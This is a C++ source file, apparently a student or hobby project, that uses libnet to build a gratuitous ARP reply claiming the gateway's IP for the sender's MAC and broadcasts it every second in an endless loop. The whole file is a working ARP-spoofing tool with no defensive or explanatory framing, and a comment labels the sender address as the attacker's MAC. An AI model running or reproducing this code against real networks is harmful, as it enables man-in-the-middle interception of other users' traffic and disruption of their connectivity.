#include "arp_spoofer.h"

#include <chrono>
#include <thread>

void arp_spoof(char *interface_name, char *default_gateway_ip) {
    char errbuf[LIBNET_ERRBUF_SIZE];
    static struct libnet_context *ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
    // LIBNET_LINK means that You have to build up to ethernet header

    libnet_build_arp_spoof(
            default_gateway_ip,
            ln
    );

    while (true) {
        libnet_write(ln);
        std::chrono::seconds sec = std::chrono::seconds(1);
        std::this_thread::sleep_for(sec); // TODO czy to musi być this_thread? Bo do tego trzeba spcejalnie include'ować <thread>
    }
}

void libnet_build_arp_spoof(char *default_gateway_ip, libnet_context *ln) {
    struct libnet_ether_addr *src_hw_addr = libnet_get_hwaddr(ln); // Returns the MAC address for the device libnet was initialized with:
    u_int32_t target_ip_addr = libnet_name2addr4(ln, default_gateway_ip, LIBNET_RESOLVE);
    // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address:
    u_int32_t zero_ip_addr = libnet_name2addr4(ln, const_cast<char *>("0.0.0.0"), LIBNET_DONT_RESOLVE);

    u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    u_int8_t zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    libnet_autobuild_arp(
            ARPOP_REPLY,                     /* operation type       */
            src_hw_addr->ether_addr_octet,   /* sender hardware addr (attacker's mac) */
            (u_int8_t *) &target_ip_addr,    /* sender protocol addr (gateway's ip)*/
            zero_hw_addr,                    /* target hardware addr (any MAC asked)*/
            (u_int8_t *) &zero_ip_addr,      /* target protocol addr */
            ln);                             /* libnet context       */
    libnet_autobuild_ethernet(
            bcast_hw_addr,                   /* ethernet destination */
            ETHERTYPE_ARP,                   /* ethertype            */
            ln);                             /* libnet context       */
}